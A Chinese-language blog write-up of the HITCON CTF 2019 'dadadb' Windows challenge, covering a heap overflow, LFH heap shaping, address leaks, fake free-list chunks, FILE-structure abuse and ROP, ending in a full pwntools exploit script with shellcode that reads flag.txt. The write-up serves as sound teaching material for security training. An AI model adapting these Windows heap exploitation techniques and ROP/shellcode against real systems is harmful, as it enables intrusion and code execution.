---
layout: post
title:  "HITCON CTF 2019 dadadb Writeup"
img: windbg.jpg
tags: [HTICON, Writeup, CTF]
---

這題很久以前就在台灣好厲駭的課程聽過了，但一直沒有自己解過，趁 AIS3 EOF final 開始前趕快練一下( 結果決賽的 pwn 題沒有 windows...) 。官方解在 [angelboy dadadb](https://github.com/scwuaptx/CTF/blob/master/2019-writeup/hitcon/dadadb/dadadb.pdf) ， angelboy 的 writeup 已經很詳細了，我主要以自己遇到的問題做紀錄。

* [程式行為](#程式行為)
* [漏洞利用](#漏洞利用)
	* [Arbitrary memory read](#arbitrary-memory-read)
	* [Arbitrary memory write](#arbitrary-memory-write)
	* [Get flag](#get-flag)
* [Payload](#payload)

# 程式行為

一個簡單的 db ，需要登入才能使用功能，帳密存在 user.txt。

* add(key, size, data)
	* 若 key 已存在則 `free(node->data); node->data = malloc(node->old_data_size)`
	* 漏洞發生在這裡，會用舊的 size 讀資料進 heap 所以可以做 heap overflow
* view(key)
* remove(key)

存資料的 node 結構：
```c
struct node{
        char* data;
        size_t size;
        char key[KEY_SIZE+1];
        struct node* next;
};
```

# 漏洞利用

上述提到除了可以做 heap overflow 之外還可以做 heap 上的 memory leak，因為 view(key) 這個功能會讀 size 個 bytes 出來。可以任意讀寫 heap 段後，如果能控制 node->data 就能做任意記憶體讀取，不過由於 windows heap 非常複雜，但有了[angelboy 的 windows heap 簡報後](https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-chinese-version) 事情就變得容易些了。

windows heap 有分為 default heap 以及 private heap 總之都是先獲得一個 HANDLE 然後再用他去呼叫 HeapAlloc ，這題在比賽前幾天被改成 private heap

* default heap
	* 預設的 heap 結構，利用 GetProcessHeap function 取得 HANDLE，會和 windows api 共用，所以很難知道自己的 chunk 怎麼來的
* private heap
	* 利用 HeapCreate function 建立 HANDLE，會跟 windows api 分開，比較好 trace heap 行為 (windbg 內直接 `dt _HEAP 拿到的 HANDLE` 可以查看 \_HEAP 結構 )

![](https://i.imgur.com/LaBIeKC.png)

## Arbitrary memory read

因為是練習，所以我會照著預期解做。預期解的情境是 default heap 因此複雜很多，首先因為不知道會拿到哪個 chunk ，若對一個自己不知道的 chunk overflow 是沒有用的，所以要使用 LFH 的特性來解，作法是這樣的，啟用 LFH 之後，LFH 會隨機分配空間內的 chunk ，所以無法知道是哪一塊，但在還沒用滿前就只會在某個分給 LFH 的記憶體範圍內，只要用滿他的空間 (malloc 16 次) 然後 free 掉其中一塊，這時會有一個洞在那，我們就能確定下次 malloc 的點就在那個洞裡 (詳細還是請看 [angelboy 的 windows heap 簡報](https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-chinese-version))，為了 overflow node 結構，malloc 的 size 要控在 0x60。

1. 用 node 填滿 0x60 的 LFH ，`add(f'fill_{i}', 0x100, b'A')` 做 16 次
2. 留一個洞 `remove('fill_0')` 然後 `add('fill_1', 0x60, buf)`
3. 這時可以 leak 出下一個 chunk 是哪個
4. overflow 下一個 chunk `add('fill_1', 0x60, buf)` 仔細蓋掉 data 就能做任意記憶體讀取

接下來當然是把一堆東西 leak 出來給後續使用，會需要的東西有：

* ntdll (from heap lock)
	* 好用的 gadget 都在這
* program base (from ntdll)
	* shellcode 位址以及 leak 更多東西
* kernel32 (from program base)
	* 讀 flag (CreateFile, ReadFile, WriteFile)
* PEB (from ntdll)
	* stdin/stdout/stderr 的 HANDLE 可以用 \_PEB-\>ProcessParameters 這個結構拿到
* TEB (from PEB)
	* 提供 stack address
* stack address (from TEB)
	* 用來控 return address 並且做 ROP
	* 要注意的是 return address 要用掃描的，因為你不知道對方初始的環境變數或 stack 上會有什麼奇怪的東西讓 offset 跑掉。

leak 時會用到的一些指令：

* lm
	* 列出載入的 module 的位址 ( 主程式以及 dll)

![](https://i.imgur.com/2x0wQaw.png)

* !address
	* 類似 gdb 的 vmmap 可以看各個 page 的狀態

![](https://i.imgur.com/sELj3N8.png)

* dt
	* display type，用來看結構，有給位址的話可以幫你解析 field

![](https://i.imgur.com/nJLgkIr.png)

* !peb, !teb
	* 直接幫你找出並顯示 PEB 和 TEB 的資訊
* s
	* 類似 peda 的 searchmem (例如可以在 ntdll 裡面找 PEB 或其他想要的位址)

![](https://i.imgur.com/fKxloLd.png)

## Arbitrary memory write

非預期解只要把 fake chunk 構造在 stack，讓下次 malloc 得到他然後寫掉 return address 做 ROP 就可以了，預期解是利用全域變數 fp (讀 user.txt 的 pointer) 這個 file structure 來做 arbitrary memory write，把 ROP chain 寫進 return address。

windows heap 有分前 / 後端管理器，剛剛提到的 LFH 屬於前端，為了拿到假的 chunk 需要使用後端管理器的特性，類似 Linux 的 large bin ，每個 free chunk 會有 fd 和 bk 指向鄰近的 free chunk。構造假 chunk 到 fp 上的步驟：

```
1. add('A', 0x440, 'aaaa')
2. add('A', 0x100, 'aaaa')
3. add('B', 0x100, 'bbbb')
4. add('C', 0x100, 'cccc')
5. add('D', 0x100, 'dddd')
6. remove('B')
7. remove('D')
8. 把 fake chunk 放在 user, pass 兩個全域變數內
9. 利用 heap overflow 把 free list 改成 B->fake2(pass)->fake1(user)
```

利用 A 可以拿到經過 encode 的 chunk header、B 和 D 的位址，就可以把 fake chunk 放進 free list ( 如果能寫到 D chunk 的話應該可以插一個 fake chunk 進去就好 ) 。

接下來的任務就是利用 windows file struct 把 ROP chain 讀進 stack ，有了 [angelboy 的簡報](https://github.com/scwuaptx/CTF/blob/master/2019-writeup/hitcon/dadadb/dadadb.pdf)我們只要照著做就好 :3 簡單來說就是：

```
1. _file = 0 (stdin)
2. _flag = 0x2080 (_IOALLOCATED | _IOBUFFER_USER)
3. _cnt = 0
4. _base = return address
5. _bufsize >= fread 所讀的量 (這題是 0x100)
```

## Get flag

接下來就是 ROP 讀 shellcode 進來然後用 VirtualProtect 改成可執行再跳過去就拿到 flag 了。

還有一點是如果用 default heap 的話，剛剛弄壞的 heap 需要重新設定，不然跑 winapi 的時候會壞掉，我懶所以就跳過沒做 :3

```
1. new_heap = HeapCreate
2. _PEB->ProcessHeap = new_heap
3. ntdll!LdrpHeap = new_heap
```

# Payload

{% highlight python lineos %}
from pwn import *
import time
import sys


def add(key, size, data):
    proc.sendlineafter(b'>>', b'1')
    proc.sendlineafter(b':', key)
    proc.sendlineafter(b':', f'{size}'.encode())
    proc.sendafter(b':', data)


def view(key):
    proc.sendlineafter(b'>>', b'2')
    proc.sendlineafter(b':', key)
    proc.recvuntil(b'Data:')


def remove(key):
    proc.sendlineafter(b'>>', b'3')
    proc.sendlineafter(b':', key)


def logout():
    proc.sendlineafter(b'>>', b'4')


def login(name, password):
    # login
    proc.sendlineafter(b'>>', b'1')
    proc.sendafter(b':', name)
    proc.sendafter(b':', password)


def exploit():
    if len(sys.argv) <= 1:
        input('attach to pid: {}'.format(proc.proc.pid))
    login(b'ddaa\n', b'phdphd\n')

    for i in range(19):
        add(f'LFH_{i}', 0x200, 'LFH')
    for i in range(0x10):
        add(f'fill_{i}', 0x200, 'LFH')
    remove('fill_0')
    add('fill_1', 0x60, 'AAAA')
    view('fill_1')
    # data + chunk header
    proc.recv(0x60 + 0x10)
    heap_base = u64(proc.recv(8)) & ~0xffff
    size = u64(proc.recv(8))
    next_node = proc.recvuntil(b'\x00')[:-1]
    log.info('heap: ' + hex(heap_base))
    lock = heap_base + 0x2c0

    def leak(addr):
        add(b'fill_1', 0x60, b'A' * 0x70 + p64(addr))
        view(next_node)
        return u64(proc.recv(8))
    
    ntdll = leak(lock) - 0x163d10
    log.info('ntdll: ' + hex(ntdll))
    # 00000000`00163d10

    program = leak(ntdll + 0x01652c8) - 0xf8
    log.info('program: ' + hex(program))

    peb = leak(ntdll + 0x1652e8) - 0x240
    log.info('peb: ' + hex(peb))

    stack = leak(peb + 0x1010)
    log.info('stack: ' + hex(stack))

    kernel32 = leak(program + 0x3000) - 0x22680
    log.info('kernel32: ' + hex(kernel32))

    process_parameter = leak(peb + 0x20)
    stdin = leak(process_parameter + 0x20)
    log.info('stdin:' + hex(stdin))

    stdout = leak(process_parameter + 0x28)
    log.info('stdout:' + hex(stdout))

    target = program + 0x1e38
    ret_addr = stack + 0x2000 + (0x100 * 8)
    found = False
    for i in range(0x1000 // 8):
        print(i, hex(ret_addr))
        if leak(ret_addr) == target:
            print('Found return address')
            found = True
            break
        ret_addr += 8
    assert found
    ret_addr -= 0x280

    add(b'A', 0x440, b'AAAA' * 8)
    add(b'A', 0x100, b'AAAA' * 8)
    add(b'B', 0x100, b'BBBB' * 8)
    add(b'C', 0x100, b'CCCC' * 8)
    add(b'D', 0x100, b'DDDD' * 8)
    remove(b'B')
    remove(b'D')
    view(b'A')
    proc.recv(0x100)
    fake_chunk_header = proc.recv(0x10)
    B_flink = u64(proc.recv(8))
    B_blink = u64(proc.recv(8))
    proc.recv(0x100 + 0x110)
    D_flink = u64(proc.recv(8))
    D_blink = u64(proc.recv(8))
    print(hex(B_flink), hex(B_blink))
    print(hex(D_flink), hex(D_blink))
    B_addr = D_blink
    pass_adr = program + 0x5648
    user_adr = program + 0x5620
    add(b'A', 0x100, b'A' * 0x100 + fake_chunk_header + p64(pass_adr + 0x10))
    logout()
    # B->fake2(pass)->fake1(user)
    fake2 = b'phdphd\x00'.ljust(8, b'\x00') + fake_chunk_header[8:]
    fake2 += p64(user_adr + 0x10) + p64(D_blink)
    fake1 = b'ddaa\x00'.ljust(8, b'\x00') + fake_chunk_header[8:]
    fake1 += p64(D_flink) + p64(pass_adr + 0x10)
    login(fake1, fake2)

    cnt = 0
    _ptr = 0
    _base = ret_addr
    flag = 0x2080
    fd = 0
    bufsize = 0x100+0x10
    obj = p64(_ptr) + p64(_base) + p32(cnt) + p32(flag)
    obj += p32(fd) + p32(0) + p64(bufsize) +p64(0)
    obj += p64(0xffffffffffffffff) + p32(0xffffffff) + p32(0) + p64(0)*2

    add(b'BBBB', 0x100, obj)
    add(b'BSS', 0x100, b'S' * 0x10 + p64(B_addr))

    logout()
    input('a')
    login(b'aaaa', b'aaaa')

    pop_rdx_rcx_r8_r9_r10_r11 = ntdll + 0x8fb30
    shellcode_addr = program + 0x5000

    readfile = kernel32 + 0x22680
    virtualprotect = kernel32 + 0x1b680
    buf = flat(pop_rdx_rcx_r8_r9_r10_r11, shellcode_addr)
    buf += flat(stdin, 0x100, shellcode_addr + 0x100, 10, 11, readfile)
    buf += flat(pop_rdx_rcx_r8_r9_r10_r11, 0x1000, shellcode_addr)
    buf += flat(0x40, ret_addr + 0x100 - 8, 0, 11)
    buf += flat(virtualprotect, shellcode_addr)
    proc.send(buf.ljust(0x100 - 8) + p64(0x4))

    writefile = kernel32 + 0x22770
    createfile = kernel32 + 0x222f0

    shellcode = f'''
        jmp readflag
    flag:
        pop r11
    createfile:
        mov qword ptr [rsp + 0x30], 0
        mov qword ptr [rsp + 0x28], 0x80
        mov qword ptr [rsp + 0x20], 3
        xor r9, r9
        mov r8, 1
        mov rdx, 0x80000000
        mov rcx, r11
        mov rax, {createfile}
        call rax
    readfile:
        mov qword ptr [rsp + 0x20], 0
        lea r9, [rsp + 0x200]
        mov r8, 0x100
        lea rdx, [rsp + 0x100]
        mov rcx, rax
        mov rax, {readfile}
        call rax
    writefile:
        mov qword ptr [rsp + 0x20], 0
        lea r9, [rsp + 0x200]
        mov r8, 0x100
        lea rdx, [rsp + 0x100]
        mov rcx, {stdout}
        mov rax, {writefile}
        call rax
    loop:
        jmp loop
    readflag:
        call flag
    '''
    shellcode = (asm(shellcode) + b'flag.txt\x00').ljust(0x100, b'\x90') 
    proc.send(shellcode)


if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc 192.168.9.1 4869'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['filename'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
{% endhighlight %}


這次學到了很多 windows 上的 pwn 技巧，其實跟 Linux 類似，但就是工具要花點時間熟悉。最後列些 tips:

* ntdll 內有 pop rdx; pop rcx; pop r8; pop r9; 這樣好用的 gadget
* windows calling convention: func(rcx, rdx, r8, r9, rsp+0x20, ...)
* windbg 反白然後右鍵可以複製，再按一次可以貼上 (?
* windbg F6 快速進 attach 頁面
